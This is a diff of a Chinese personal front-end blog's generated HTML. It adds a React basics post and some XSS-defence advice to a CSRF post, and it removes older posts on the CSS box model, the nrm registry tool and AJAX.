class="line"><span class="regexp">render(&lt;FirstComponent /</span>&gt;,RootDom);</div></pre></td></tr></table></figure>
+<hr>
+<h2 id="组件的生命周期："><a href="#组件的生命周期：" class="headerlink" title="组件的生命周期："></a>组件的生命周期：</h2><ol>
+<li>componentWillMount</li>
+<li>render</li>
+<li>componentDidMount</li>
+<li>shouldComponentUpdate</li>
+<li>componentWillUpdate</li>
+<li>render</li>
+<li>componentDidUpdate</li>
+</ol>
+<p><strong>常用的生命周期：</strong></p>
+<ol>
+<li>componentDidMount</li>
+<li>componentWillReceiveProps</li>
+<li>shouldComponentUpdate</li>
+</ol>
+<hr>
+<h2 id="props"><a href="#props" class="headerlink" title="props"></a>props</h2><ul>
+<li><p>children</p>
+</li>
+<li><p><code>{/*&lt;A a=&#39;1&#39;&gt; ==&gt; props = {a:&#39;1&#39;}*/}</code></p>
+</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">  render() &#123;</div><div class="line">    <span class="keyword">return</span> &lt;div&gt;&#123;this.props.gender &#125; + &#123;this.props.name&#125;&lt;/div&gt;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChildComponent</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</div><div class="line">    render()&#123;</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">        &lt;div&gt;</div><div class="line">            &#123;<span class="keyword">this</span>.props.children&#125;</div><div class="line">            &lt;Welcome gender=<span class="string">'male'</span> name=<span class="string">'slashhuang'</span> /&gt;</div><div class="line">        &lt;<span class="regexp">/div&gt;);</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp"> &#125;;</span></div><div class="line"><span class="regexp">render(&lt;ChildComponent&gt;我是个孩子&lt;/</span>ChildComponent&gt;,RootDom);</div></pre></td></tr></table></figure>
+<hr>
+<h2 id="state-props"><a href="#state-props" class="headerlink" title="state + props"></a>state + props</h2><ul>
+<li>setState 异步操作，setState后会自动做一些优化操作 然后进入队列 更新状态</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">PropState</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</div><div class="line">    <span class="keyword">constructor</span>()&#123;</div><div class="line">        <span class="keyword">super</span>();</div><div class="line">        <span class="keyword">this</span>.state=&#123;<span class="attr">a</span>:<span class="string">'I am state'</span>&#125;</div><div class="line">    &#125;</div><div class="line">    click()&#123;</div><div class="line">        <span class="comment">/**</span></div><div class="line"><span class="comment">         * setState ==&gt; 本组件重新render</span></div><div class="line"><span class="comment">         */</span></div><div class="line">        <span class="keyword">this</span>.setState(&#123;</div><div class="line">            a:<span class="string">'我更新啦 哈哈哈'</span></div><div class="line">        &#125;)</div><div class="line">    &#125;</div><div class="line">    render()&#123;</div><div class="line">        <span class="keyword">return</span> &lt;div onClick=&#123;()=&gt;this.click()&#125;&gt;</div><div class="line">                &#123;this.state.a&#125;</div><div class="line">                &lt;A name= &#123;this.state.a&#125; /&gt;</div><div class="line">              &lt;/div&gt;</div><div class="line">    &#125;</div><div class="line"> &#125;;</div><div class="line">const A = (props) =&gt; &#123;</div><div class="line">    return &lt;div&gt;&#123;props.name&#125;&lt;/div&gt;</div><div class="line">&#125;</div><div class="line">render(&lt;PropState/&gt;,RootDom);</div></pre></td></tr></table></figure>
+<hr>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">JSX： xml <span class="keyword">in</span> javascript</div><div class="line"><span class="number">1.</span> tagName</div><div class="line"><span class="number">2.</span> attributes(props)</div><div class="line"><span class="number">3.</span> children</div></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">组件化：</div><div class="line"><span class="number">1.</span> 函数式组建: props ==&gt; JSX ; </div><div class="line"><span class="number">2.</span> 类组件：<span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="title">extendx</span> <span class="title">Component</span></span></div></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span> 数据源： state + props</div><div class="line"><span class="number">2.</span> 更新数据：setState</div></pre></td></tr></table></figure>
+<p>( 完 )</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/23/CSRF-跨站请求伪造/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -728,7 +1347,12 @@
 </tbody>
 </table>
 <ul>
-<li>前端代码<br>尽量避免使用 <code>innerHtml</code> 或 <code>eval</code> 这种危险的方式运行代码，没准你的用户就会利用这些 JS 方法的特殊性，在你的网站上嵌入一些恶意的脚本，从而对你的网站及你的客户造成不利影响。</li>
+<li><p>前端代码<br>尽量避免使用 <code>innerHtml</code> 或 <code>eval</code> 这种危险的方式运行代码，没准你的用户就会利用这些 JS 方法的特殊性，在你的网站上嵌入一些恶意的脚本，从而对你的网站及你的客户造成不利影响。</p>
+</li>
+<li><p>当然还有很多其他方法的 XSS 攻击，有兴趣的小伙伴可以移步我的另一篇文章 《一个模拟-XSS-攻击的小游戏》了解更多的攻击方法，以制定合理的防御策略。</p>
+</li>
+<li><p>安利：React DOM 在渲染之前默认会过滤 所有传入的值。它可以确保你的应用不会被注入攻击，所有的内容在渲染之前都被转换成了字符串，这样可以有效地防止 XSS(跨站脚本) 攻击。</p>
+</li>
 </ul>
 <p>（完）</p>
 
@@ -1880,7 +2504,7 @@
 <ul>
 <li>将CSS代码放在HTML页面的顶部</li>
 <li>避免使用CSS表达式</li>
-<li>使用<code>&lt;link&gt;</code>来代替@import</li>
+<li>使用<code>&lt;link&gt;</code>来代替 <code>@import</code></li>
 <li>避免使用Filters</li>
 </ul>
 <ol>
@@ -2177,680 +2801,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/盒子模型/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Albert">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpeg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Albert's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/18/盒子模型/" itemprop="url">盒子模型</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-18T23:26:45+08:00">
-                2017-09-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CSS/" itemprop="url" rel="index">
-                    <span itemprop="name">CSS</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            <!--noindex-->
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/09/18/盒子模型/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count hc-comment-count" data-xid="2017/09/18/盒子模型/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-              <!--/noindex-->
-            
-          
-
-          
-          
-             <span id="/2017/09/18/盒子模型/" class="leancloud_visitors" data-flag-title="盒子模型">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>梳理基础知识，从 CSS 盒模型开始！</p>
-</blockquote>
-<h2 id="一、什么是盒子模型"><a href="#一、什么是盒子模型" class="headerlink" title="一、什么是盒子模型"></a>一、什么是盒子模型</h2><p>我们先看一张图：</p>
-<p><a href="http://oux9sg1nc.bkt.clouddn.com/17-9-18/80360528.jpg" target="_blank" rel="external"> @盒子模型 | center </a></p>
-<p>最开始看着这张图的时候，觉得与其说是盒模型，倒不如说是张画布( 不是 canvas svg 的意思 )，直到我遇上了外边距合并 <code>(ｷ｀ﾟДﾟ´)!!</code> 下面，请听我娓娓道来。</p>
-<p>首先，这货规定了哪些地方你可以画上哪些东西：</p>
-<p>如图所示，由内而外依次是 <code>content</code> , <code>padding</code> , <code>bording</code> , <code>margin</code></p>
-<ol>
-<li><p>content : 真正容纳东西的区域，在 content 中你可以画上 其他元素、文本 等任意内容。</p>
-</li>
-<li><p>padding : 盒子的内边距，包裹在 content 之外，可以想象成快递中的空气气囊，夹在 border 和 content 之间。</p>
-</li>
-<li><p>border : 盒子的边框，相当于你在 padding 外镶了一层。border 可以指定 颜色、粗细、样式等。（相当于一个阉割版的 content）</p>
-</li>
-<li><p>margin : 盒子的外边距外边距，这个盒子周围空置的安全区域（在不发生外边距折叠的情况下）</p>
-</li>
-</ol>
-<h2 id="二、使用开发者工具查看盒模型"><a href="#二、使用开发者工具查看盒模型" class="headerlink" title="二、使用开发者工具查看盒模型"></a>二、使用开发者工具查看盒模型</h2><p>emmmmm，个人觉得先学会使用开发者工具的部分功能后，会对学习盒子模型降低很大的时间成本。</p>
-<p>话不多说，直接看图：</p>
-<p>不对不对，你打开 Chrome 浏览器先 =。=</p>
-<p><img src="https://ws1.sinaimg.cn/large/889b2f7fgy1fjp9ye8lqsj207t0840sw.jpg" alt="@右键菜单 | center"></p>
-<p>这时候你可以单击检查，然后会弹出控制台（开发者工具）。当然你也可以按 F12</p>
-<p><img src="https://ws1.sinaimg.cn/large/889b2f7fgy1fjp9zqaz90j20qi093abt.jpg" alt="@开发者工具 | center"></p>
-<p>Elements : 网页中的各个元素，你可以尝试着移动鼠标到某个元素后，单机选中元素，然后会得到类似如下图一样结果，注意红线选中部分。</p>
-<p>（当然一般都是单击左上角的一个小鼠标箭头的图标，然后直接单击网页呈现的内容选择）</p>
-<ol>
-<li>右上角的箭头，单击后可以直接单击选择页面呈现的元素，并在控制台中定位</li>
-<li>DOM 文档中蓝色背景标签 p，我刚刚选中的那个元素</li>
-<li>下面有个类似导航条一样的东西，是当前选中元素所在的层级</li>
-<li>右边 styles 是当前元素的 CSS 样式，点击 computed 可以查看最终计算后的样式</li>
-<li>styles 一栏滚动到底部有这么一个花里胡哨的框框，就是盒子模型，从内到外依次和上面介绍的那个一样，而且有文字注明</li>
-</ol>
-<p><img src="https://ws1.sinaimg.cn/large/889b2f7fgy1fjpa9rz9h5j20qg09975w.jpg" alt="@选中元素 | center"></p>
-<p>ok,知道了这些基本使用后，我们来了解一下盒子模型的尺寸</p>
-<h2 id="三、盒模型的尺寸"><a href="#三、盒模型的尺寸" class="headerlink" title="三、盒模型的尺寸"></a>三、盒模型的尺寸</h2><p>慢着，在讲盒模型尺寸前，最好先简单了解一个可以帮助你解决很多问题的属性： <code>box-sizing</code></p>
-<p><code>box-sizing</code> 属性可以帮助我们在 <code>标准盒模型</code> 与 <code>IE 盒模型</code> 中自由切换（为什么这么称呼请自行 Google）</p>
-<p>需要注意的是：这两个盒子模型的尺寸的计算方法是不一样的！</p>
-<h3 id="box-sizing-border-box-（IE-盒模型）"><a href="#box-sizing-border-box-（IE-盒模型）" class="headerlink" title="box-sizing : border-box; （IE 盒模型）"></a>box-sizing : border-box; （IE 盒模型）</h3><p>观察下图，明显表示了，在 IE 盒模型中</p>
-<ul>
-<li>width = content 宽度 + 左右 padding 宽度 + 左右 border 宽度</li>
-<li>height = content 高度 + 左右 padding 高度 + 左右 border 高度</li>
-</ul>
-<p><a href="http://oux9sg1nc.bkt.clouddn.com/17-9-19/63380423.jpg" target="_blank" rel="external">@IE盒模型 | center</a></p>
-<h3 id="box-sizing-content-box-（标准盒模型）"><a href="#box-sizing-content-box-（标准盒模型）" class="headerlink" title="box-sizing : content-box; （标准盒模型）"></a>box-sizing : content-box; （标准盒模型）</h3><p>标准盒模型是默认值，现在看一下与 IE 盒模型有什么不同</p>
-<ul>
-<li>width = content 宽度</li>
-<li>height = content 高度</li>
-</ul>
-<p><a href="http://oux9sg1nc.bkt.clouddn.com/17-9-19/5178800.jpg" target="_blank" rel="external">@标准盒模型 | center</a></p>
-<h3 id="box-sizing-inherit"><a href="#box-sizing-inherit" class="headerlink" title="box-sizing : inherit;"></a>box-sizing : inherit;</h3><p>继承父元素的盒模型样式。</p>
-<p>以上就是 box-sizing 的简介，很简单，但很实用。</p>
-<h3 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h3><p>关于兼容性的问题，请移步 <a href="https://caniuse.com/#search=box-sizing" target="_blank" rel="external"> caniuse.com </a></p>
-<p>关于盒子模型的介绍基本就到这里。</p>
-<p>（完）</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/nrm-npm-registry-管理工具/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Albert">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpeg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Albert's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/18/nrm-npm-registry-管理工具/" itemprop="url">nrm ---- npm registry 管理工具</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-18T21:51:38+08:00">
-                2017-09-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/npm/" itemprop="url" rel="index">
-                    <span itemprop="name">npm</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            <!--noindex-->
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/09/18/nrm-npm-registry-管理工具/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count hc-comment-count" data-xid="2017/09/18/nrm-npm-registry-管理工具/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-              <!--/noindex-->
-            
-          
-
-          
-          
-             <span id="/2017/09/18/nrm-npm-registry-管理工具/" class="leancloud_visitors" data-flag-title="nrm ---- npm registry 管理工具">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="一、什么是-nrm"><a href="#一、什么是-nrm" class="headerlink" title="一、什么是 nrm"></a>一、什么是 nrm</h2><p>一个 npm registry 管理工具。</p>
-<h2 id="二、nrm-干嘛用"><a href="#二、nrm-干嘛用" class="headerlink" title="二、nrm 干嘛用"></a>二、nrm 干嘛用</h2><p>可以快速切换至其他 npm 源下载你需要的包</p>
-<h2 id="三、为什么要用"><a href="#三、为什么要用" class="headerlink" title="三、为什么要用"></a>三、为什么要用</h2><ol>
-<li>当前源不稳定，安装某些包时经常卡住不动</li>
-<li>npm 官方源上不去了（国内互联网不可描述的原因）</li>
-<li>你不会手动切换 npm 其他源，或者你不知道还有哪些源</li>
-</ol>
-<h2 id="四、如何使用"><a href="#四、如何使用" class="headerlink" title="四、如何使用"></a>四、如何使用</h2><ol>
-<li><p>install</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install -g nrm</div></pre></td></tr></table></figure>
-</li>
-<li><p>show registry list</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">nrm ls</div><div class="line"></div><div class="line">* npm ---- https://registry.npmjs.org/</div><div class="line">  cnpm --- http://r.cnpmjs.org/</div><div class="line">  taobao - https://registry.npm.taobao.org/</div><div class="line">  nj ----- https://registry.nodejitsu.com/</div><div class="line">  rednpm - http://registry.mirror.cqupt.edu.cn/</div><div class="line">  npmMirror  https://skimdb.npmjs.com/registry/</div><div class="line">  edunpm - http://registry.enpmjs.org/</div></pre></td></tr></table></figure>
-</li>
-<li><p>change target registry</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># switch registry to cnpm</span></div><div class="line">nrm use cnpm</div><div class="line"></div><div class="line">    Registry has been <span class="built_in">set</span> to: http://r.cnpmjs.org/</div></pre></td></tr></table></figure>
-</li>
-<li><p>show help</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nrm <span class="built_in">help</span></div><div class="line"></div><div class="line"><span class="comment"># here to show all of the nrm cmmands</span></div></pre></td></tr></table></figure>
-</li>
-</ol>
-<h2 id="五、注意事项"><a href="#五、注意事项" class="headerlink" title="五、注意事项"></a>五、注意事项</h2><p>当你使用其他源的时候，你无法使用 npm 的 publish 命令发布你的 npm 包，需要切换回官方源。</p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/Pana/nrm" target="_blank" rel="external"> nrm – NPM registry manager - Github </a></p>
-<p>（完）</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/14/AJAX-与-XMLHttpRequest/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Albert">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpeg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Albert's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/14/AJAX-与-XMLHttpRequest/" itemprop="url">AJAX 与 XMLHttpRequest 入门</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-14T01:13:03+08:00">
-                2017-09-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/javascript/" itemprop="url" rel="index">
-                    <span itemprop="name">javascript</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            <!--noindex-->
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/09/14/AJAX-与-XMLHttpRequest/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count hc-comment-count" data-xid="2017/09/14/AJAX-与-XMLHttpRequest/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-              <!--/noindex-->
-            
-          
-
-          
-          
-             <span id="/2017/09/14/AJAX-与-XMLHttpRequest/" class="leancloud_visitors" data-flag-title="AJAX 与 XMLHttpRequest 入门">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="一、-AJAX-简介"><a href="#一、-AJAX-简介" class="headerlink" title="一、 AJAX 简介"></a>一、 AJAX 简介</h2><ul>
-<li><p>AJAX 全称 AsynchronousJavascript+XML ==&gt; 异步传输 + js + xml。</p>
-</li>
-<li><p>所谓异步，在这里简单地解释就是：向服务器发送请求的时候，我们不必等待结果，而是可以同时做其他的事情，等到有了结果我们可以再来处理这个事。这个很重要，如果不是这样的话，我们点完按钮，页面就会死在那里，其他的数据请求不会往下走了。这样比等待刷新似乎更加讨厌。</p>
-</li>
-<li><p>虽然提供异步通讯功能的组件默认情况下都是异步的，但它们也提供了同步选项，如果你好奇把那个默认参数为 <code>true</code> 的选项改为 <code>false</code> ，你的页面就会死在那里，等待请求结果返回之后再执行下一步操作。</p>
-</li>
-<li><p><code>xml</code> 只是一种数据格式，在这件事里并不重要，我们在更新一行字的时候理论上说不需要这个格式，但如果我们更新很多内容，那么格式化的数据可以使我们有条理地去实现更新。</p>
-</li>
-<li><p>目前大部分都是在用 <code>JSON</code> 这种格式来代替 <code>XML</code> 的，因为前者更加简洁，据说目前的解析速度也更快。</p>
-</li>
-</ul>
-<p><strong>总结：只要是 JS 调用异步通讯组件并使用格式化的数据来更新 web 页面上的内容或操作过程，那么我们用的方法就可算是 AJAX</strong></p>
-<h2 id="二、使用-AJAX"><a href="#二、使用-AJAX" class="headerlink" title="二、使用 AJAX"></a>二、使用 AJAX</h2><p>ok 看了上面的简介部分，是时候实际运用一波了，来来，把手伸出来</p>
-<p>这里是一个简单的例子：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 定义一个存储请求 URL 地址的变量</span></div><div class="line"><span class="keyword">var</span> getWeather = <span class="string">"https://jirenguapi.applinzi.com/weather.php"</span>;</div><div class="line"><span class="comment">// 定义一个发送 AJAX 请求的函数</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendAJAX</span>(<span class="params">url</span>)</span>&#123;</div><div class="line">    <span class="comment">// 构造一个 XMLHttpRequest 实例</span></div><div class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">    <span class="comment">// 调用open 方法创建一个新的 HTTP 请求，并指定此请求的方法、URL 等信息</span></div><div class="line">    xhr.open(<span class="string">"GET"</span>, url, <span class="literal">true</span>)</div><div class="line">    <span class="comment">// 调用 send 方法发送请求</span></div><div class="line">    xhr.send()</div><div class="line">    <span class="comment">// 追踪 AJAX 请求状态</span></div><div class="line">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="comment">// 对应 readyState 值为4 表示请求完成</span></div><div class="line">        <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span>)&#123;</div><div class="line">            <span class="comment">// 判断返回的 HTTP 状态码</span></div><div class="line">            <span class="keyword">if</span>(xhr.status === <span class="number">200</span> || xhr === <span class="number">304</span> )&#123;</div><div class="line">                <span class="comment">// 把请求到的 JSON 格式字符串转换为 JSON 格式对象</span></div><div class="line">                <span class="keyword">var</span> yunyu = <span class="built_in">JSON</span>.parse(xhr.responseText)</div><div class="line">                <span class="comment">// 控制台答应请求到的 JSON 对象</span></div><div class="line">                <span class="built_in">console</span>.log(yunyu)</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="built_in">console</span>.log(<span class="string">"没有拿到数据哦"</span>)</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        xhr.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">            <span class="built_in">console</span>.log(<span class="string">"异常！异常！"</span>)</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 调用 sendAJAX 参数是最初定义的 URL</span></div><div class="line">sendAJAX(getWeather)</div></pre></td></tr></table></figure></p>
-<p>请求成功后你的控制台可能会出现一个这样子的打印</p>
-<p><img src="https://ws1.sinaimg.cn/large/889b2f7fgy1fjnstxewlmj20fx03waa9.jpg" alt=" @初尝 AJAX | center "></p>
-<p>如果跟以上截图一样的，说明你请求成功了，怎么样 484很简单 <code>(*^▽^*)</code></p>
-<p>emmmm，当然也可能出现其他打印，比如请求不成功的时候,或者是一些其他问题，同时会返回其他对应的状态码。</p>
-<ul>
-<li>关于状态码的问题，可以移步这里 <a href="http://tool.oschina.net/commons?type=5" target="_blank" rel="external"> HTTP 状态码详解 </a></li>
-</ul>
